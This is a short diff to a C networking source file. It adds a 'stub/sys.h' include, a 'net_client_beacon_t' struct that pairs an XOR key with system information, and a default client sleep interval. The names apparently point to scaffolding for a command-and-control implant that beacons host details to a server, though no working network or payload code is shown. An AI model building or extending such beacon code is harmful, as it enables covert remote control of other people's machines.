@@ -21,6 +21,7 @@
 #include <arpa/inet.h>
 #include <string.h>
 #include <stdbool.h>
+#include "stub/sys.h"
 
 #ifndef NET_PORT_MIN
 #define NET_PORT_MIN 1
@@ -32,6 +33,18 @@
 
 #ifndef NET_MAX_RESPONSE_SIZE
 #define NET_MAX_RESPONSE_SIZE 1024
+#endif
+
+#ifndef NET_CLIENT_BEACON
+typedef struct{
+  int xor_key;
+  sys_info_t sysinfo;
+} net_client_beacon_t;
+#define NET_CLIENT_BEACON
+#endif
+
+#ifndef NET_CLIENT_SLEEP
+#define NET_CLIENT_SLEEP 5
 #endif
 
 bool net_host2ip(char *host, char* ip, size_t ip_size){
